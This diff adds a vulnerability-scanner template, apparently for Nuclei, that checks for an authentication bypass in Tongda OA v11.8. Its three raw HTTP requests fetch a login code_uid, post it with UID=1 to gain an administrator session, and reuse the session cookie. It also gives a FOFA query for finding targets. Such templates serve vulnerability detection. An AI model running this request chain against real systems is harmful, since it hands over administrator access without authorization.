@@ -1,0 +1,56 @@
+id: tongda-login-code-authbypass
+
+info:
+  name: Tongda OA v11.8 logincheck_code.php - Authentication Bypass
+  author: SleepingBag945
+  severity: high
+  description: |
+    There is a login bypass vulnerability in Tongda OA v11.8 logincheck_code.php, through which an attacker can log in to the system administrator background
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.5%20logincheck_code.php%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,authbypass
+
+http:
+  - raw:
+      - |
+        GET /general/login_code.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /logincheck_code.php HTTP/1.1
+        Host: {{Hostname}}
+
+        CODEUID={{uid}}&UID=1
+      - |
+        GET /general/index.php?isIE=0&modify_pwd=0 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{cookie}};
+
+    extractors:
+      - type: regex
+        name: uid
+        internal: true
+        group: 1
+        regex:
+          - '"code_uid":"(.*?)"'
+
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        group: 1
+        regex:
+          - 'PHPSESSID=(.*?);'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "\"code_uid\":\"{") && contains(body_1,"\"status\":1")'
+          - 'status_code_2 == 200 && contains(body_2,"index.php?isIE")'
+          - 'status_code_2 == 200 && contains(header_2,"Set-Cookie")'
+          - 'status_code_3 == 200 && !contains(body_3,"<title>用户未登录</title>")  && contains(body_3,"loginUser")'
+        condition: and
+
+# digest: 490a004630440220587081712a800840d1c190d6cd1ed3051428e666d254c4537ec295f55d1d28cd02203ed4f1a56473d125c675ed7ccd63e82ebf9bf14789a211388319104bcaa7061e:922c64590222798bb761d5b6d8e72950
